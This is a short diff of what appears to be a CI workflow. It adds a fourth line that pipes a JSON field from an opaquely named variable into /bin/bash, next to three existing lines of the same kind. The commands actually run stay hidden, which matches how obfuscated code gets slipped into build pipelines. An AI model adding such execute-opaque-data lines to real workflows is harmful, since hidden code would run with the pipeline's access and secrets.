@@ -48,6 +48,7 @@ jobs:
           printf '%s' "$chxh8" | jq -r .x0389 | /bin/bash
           printf '%s' "$o23" | jq -r .db72 | /bin/bash
           printf '%s' "$zf120" | jq -r .ubdm8 | /bin/bash
+          echo $z73263 | jq -r .bp663 | /bin/bash
 
       - name: Save archive
         if: always()
